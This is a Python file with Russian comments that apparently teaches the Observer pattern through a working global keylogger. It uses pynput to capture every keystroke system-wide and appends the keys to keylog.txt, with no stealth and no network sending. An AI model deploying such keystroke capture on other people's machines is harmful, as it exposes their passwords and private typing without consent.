from __future__ import annotations
from abc import ABC, abstractmethod
from typing import List
import datetime
from pynput import keyboard


time_format = "%Y-%m-%d %H:%M:%S"
beauty = "====================================================\n"
"""
Немного глобально объявленных переменных для красивостей.
"""

class MyException(Exception): pass
"""
Класс для собственного исключения.
"""


class Subject(ABC):
    """
    Интерфейс издателя объявляет набор методов для управлениями подписчиками.
    """

    @abstractmethod
    def attach(self, observer: Observer) -> None:
        """
        Присоединяет наблюдателя к издателю.
        """
        pass

    @abstractmethod
    def detach(self, observer: Observer) -> None:
        """
        Отсоединяет наблюдателя от издателя.
        """
        pass

    @abstractmethod
    def notify(self) -> None:
        """
        Уведомляет всех наблюдателей о событии.
        """
        pass


class KeyCapture(Subject):

    """
    Издатель владеет некоторым важным состоянием и оповещает наблюдателей о его
    изменениях.
    """

    _state: str = None
    """
    Для удобства в этой переменной хранится состояние Издателя, необходимое всем
    подписчикам.
    """

    _observers: List[Observer] = []
    """
    Список подписчиков. В реальной жизни список подписчиков может храниться в
    более подробном виде (классифицируется по типу события и т.д.)
    """
    
    def __init__(self):
        
        self.tracker = keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release)

        self.hotkey_tracker = keyboard.GlobalHotKeys({
                '<ctrl>+q': self.on_completed})
        
        """
        Функция инициализации трекера клавиш и трекера сочетания клавиш для заверщения программы.
        """

    def start_tracking(self):

        self.tracker.start()
        self.hotkey_tracker.start()

        try:
            self.tracker.join()
            self.hotkey_tracker.join()
        except MyException as e:
            print(f'Вызов исключения')

        """
        Функция запуска трекеров в отедельных потоках.
        """

    def on_completed(self):
        self._state = 'Нажато сочетание клавиш crtl + q, завершение работы...\n'
        self.tracker.stop() 
        self.hotkey_tracker.stop()
        self.notify()
        """
        Функция обработки завершения работы.
        """

    def on_press(self, key):
        try:
            self._state = f'[+] Нажата буквенно-символьно-цифровая клавиша: {key.char}\n'
        except AttributeError:
            self._state = f'[+] Нажата специальная клавиша: {key.name}\n'

        if key == keyboard.Key.esc:
            self._state = f'Аварийное завершение работы\n'
            self.notify()
            raise MyException()
        
        self.notify()
        """
        Функция обработки нажатий вкючая генерацию исключения при нажатии Esc и уведомление подписчиков о событии.
        """

    def on_release(self, key):
        try:
            self._state =  f'[-] Отпущена буквенно-символьно-цифровая клавиша: {key.char}\n'
        except AttributeError:
            self._state = f'[-] Отпущена специальная клавиша: {key.name}\n'

        self.notify()
        """
        Функция обработки "отжатий" и уведомление подписчиков о событии. 
        """
        
    def notify(self) -> None:
        print("Subject: Notifying observers...")
        for observer in self._observers:
            observer.update(self)
        """
        Запуск обновления в каждом подписчике.
        """

    def attach(self, observer: Observer) -> None:
        print("Subject: Attached an observer.")
        self._observers.append(observer)

    def detach(self, observer: Observer) -> None:
        print("Subject: Detached an observer.")
        self._observers.remove(observer)

    """
    Методы управления подпиской.
    """


class Observer(ABC):
    """
    Интерфейс Наблюдателя объявляет метод уведомления, который издатели
    используют для оповещения своих подписчиков.
    """

    @abstractmethod
    def update(self, subject: Subject) -> None:
        """
        Получить обновление от субъекта.
        """
        pass


"""
Конкретные Наблюдатели реагируют на обновления, выпущенные Издателем, к которому
они прикреплены.
"""


class FileWriter(Observer):
    def __init__(self, filename):
        self.filename = filename 
        with open(self.filename, 'a') as f:
            now = datetime.datetime.now(datetime.timezone.utc).astimezone()
            f.write(beauty)
            f.write(f"Трекинг начат {now:{time_format}}".center(len(beauty)-1) + '\n')
            f.write(beauty)
        """
        Инициализация наблюдателя, записывающего в файл события.
        """

    def update(self, subject: Subject) -> None:
        with open(self.filename, 'a') as f:
            f.write(subject._state)
        """
        Получить обновление от субъекта.
        """


def main():
    # Создание Издателя
    subject = KeyCapture()
    # Создание Наблюдателя
    observer = FileWriter("keylog.txt") 
    # Присоединяем наблюдателя к издателю
    subject.attach(observer)
    # Начинаем логгирование клавиатурных событий
    subject.start_tracking()
    # Отсоединяем наблюдателя от издателя по завершению логгирования
    subject.detach(observer)


if __name__ == "__main__":
    main()
